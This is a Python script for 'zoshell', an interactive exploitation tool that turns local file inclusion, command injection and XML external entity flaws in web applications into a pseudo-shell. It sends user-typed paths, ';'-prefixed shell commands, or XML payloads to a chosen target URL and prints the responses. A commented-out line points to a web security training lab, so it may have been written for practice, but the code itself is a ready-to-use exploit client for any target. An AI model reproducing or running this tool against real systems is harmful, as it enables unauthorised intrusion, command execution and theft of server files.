import requests, time
from os import system
from  cmd import Cmd
import pyfiglet
from termcolor import colored
import re


asx = pyfiglet.figlet_format("zoshell") 

kk = colored(asx,"green")
print (kk)
xm= ""




print ("1= lfi") 
print ("2= rce") 
print ("3= xxe") 
a = int(input ("\033[4mzooshell\033[0m"+colored(" >>", "green")))
if a == 1 : 
        x1 = input ("part 1->")
        x2 = input ("part 2->")
        if (x1 and x2) :
                print ("you have 2 part") 
        else :
                print ("you have 1 part")


elif a == 2 : 
	rce_url = input ("enter rce url: ")
	print (rce_url)

	parm1 = {}
	n = int(input("enter number of parameters: "))
	for i in range(0,n) :
		print ("enter key",i+1,":" ,end='')
		a = input ()
		print ("enter value",i+1,":" ,end='')
		b = input ()
		parm1.update({a:b})
	print (parm1)
	print ("enter the infected parameter : " ,end=' ')
	ifp = input ()
	a = 2

elif a == 3 : 

	ix = ""
	bx = ""
	coun = 0
	url_xml=input("enter the url : ")
	print ("enter your xml payload:")
	while ix != "exploit":

		ix= input ("")
		bx = bx+"\n"+ix
		print(chr(27)+'[2j')
		print('\033c')
		print('\x1bc')
		print (colored("press enter and than write exploit", "red"))
	system('reset')
	xm= bx.replace('exploit', '')
	#print(xm)







def lfi (cm):
        if (x1 and x2) :
                url =  x1+cm+x2
                print (url)
                b = requests.get(url)
                print (b.text)
        elif (x1 or x2) :
                if (x1):
                        url =  x1+cm
                if (x2):
                        url =  x2+cm
                print (url)
                b = requests.get(url)
                print (b.text)






def xxe_lfi(args):

	headers = {'Content-Type': 'application/xml'}
	xml = xm.replace('args',args)
	print ("\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n")
	xml  = xml.replace("\n", "")
	print (xml)


	#xxe_pr = requests.post('https://ac6c1f1c1f925c5e80c2183300be007c.web-security-academy.net/product/stock', data=xml, headers=headers)
	xxe_pr = requests.post(url_xml, data=xml, headers=headers)
	print(xxe_pr.text)




class term(Cmd):

	prompt = colored("\033[4mZoshell\033[0m","red")+colored(" >>", "green")
	def default (self,args):
		if a == 1: 
			lfi(args)
		if a == 2: 
			rce0(';'+args)
		if a == 3: 
			xxe_lfi(args)


def rce0(cmm):
	headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0'}
	parm1[ifp]=  cmm
	print (parm1)



	r = requests.post(rce_url, data=parm1,headers=headers)
	print (r.status_code)
	print (r.content)


	


li2 = term()
li2.cmdloop()
